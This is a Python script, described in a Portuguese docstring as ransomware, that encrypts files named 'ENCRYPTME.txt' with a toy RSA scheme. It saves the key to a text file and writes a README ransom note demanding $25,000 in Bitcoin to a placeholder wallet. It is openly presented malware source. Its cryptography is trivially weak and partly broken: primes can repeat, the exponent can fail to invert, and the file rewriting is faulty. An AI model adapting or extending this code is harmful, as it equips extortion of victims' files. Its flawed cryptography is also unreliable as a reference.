'''
Ransomware desenvolvido utilizando algoritmo RSA para criptografia
'''

# Modules:
from base64 import b64decode, b64encode
from math import gcd
import os
from random import randrange, choice

# Main code:
def primes():
    ''' Returns two random prime value from the list '''
    prime_numbers = [
        2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41,
        43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97
    ]
    return choice(prime_numbers), choice(prime_numbers)

def phi(p, q):
    ''' Euler's Totient '''
    return (p -1) * (q -1)

def generate_pubkey(totient):
    ''' Most implementations keep a fixed default value for this '''
    # while True:
    #     exponent = randrange(2, totient)
    #     if gcd(totient, exponent) == 1:
    #         return exponent
    return int('0x10001', 0) # 65537

def generate_privkey(totient, e):
    ''' Return privkey exponent '''
    exponent = 0
    while exponent * e % totient != 1:
        exponent += 1
    return exponent

def encrypt_files(filepath, e, n):
    ''' Overwrite files to encrypted content '''
    with open(filepath, 'rb+') as file:
        _data = file.read().decode()
        open(filepath, 'w').close()     # Limpa arquivo
        file.write(b64encode(''.join(chr(ord(letter) ** e % n) for letter in _data).encode()))
        
def decrypt_files(filepath, d, n):
    ''' Overwrite files back to original content '''
    with open(filepath, 'rb+') as file:
        _data = b64decode(file.read()).decode()
        open(filepath, 'w').close()     # Limpa arquivo 
        file.write(''.join(chr(ord(letter) ** int(d) % int(n)) for letter in _data).encode())

def output_key(d, n):
    ''' Save decryption key to external file '''
    with open('DECRYPTION_KEY.txt', 'w') as file:
        privkey = b64encode((str(d)+','+str(n)).encode()).decode()

        file.write(f'----- BEGIN RSA PRIVATE KEY -----\n{privkey}\n----- END RSA PRIVATE KEY -----\n')

def ransom():
    ''' Outputs a ransom message to the victim '''
    with open('README.txt', 'w') as file:
        BTC_ADDRESS = ''    # Your BTC Address
        message = f'Unfortunately your files are inaccessible, we recommend that you do not try to manipulate the files in any way as this can lead to irreversible loss of the file. To recover the lost files, send the equivalent of $25,000 USD in Bitcoins to the wallet: {BTC_ADDRESS or None}'
        file.write(message)

def main(encrypted=False, key=None):

    ''' RSA variables '''
    if key:
        d, n = b64decode(key).decode().split(',')
    else:
        p, q = primes()
        n = p * q
        totient = phi(p, q)
        e = generate_pubkey(totient)
        d = generate_privkey(totient, e)

    ''' Send key to file '''
    output_key(d, n)
    
    ''' Search for files on system '''
    for root, _, files in os.walk('.'):
        for file in files:
            if 'ENCRYPTME.txt' in file:     # Fixed demo file
                filepath = os.path.join(root, file)

                encrypt_files(filepath, e, n) if not encrypted else decrypt_files(filepath, d, n)

    ''' Ransom message '''
    ransom()

if __name__ == '__main__':
    
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument('--decrypt', dest='key')
    args = parser.parse_args()

    if args.key:
        main(True, args.key)
    else:
        main()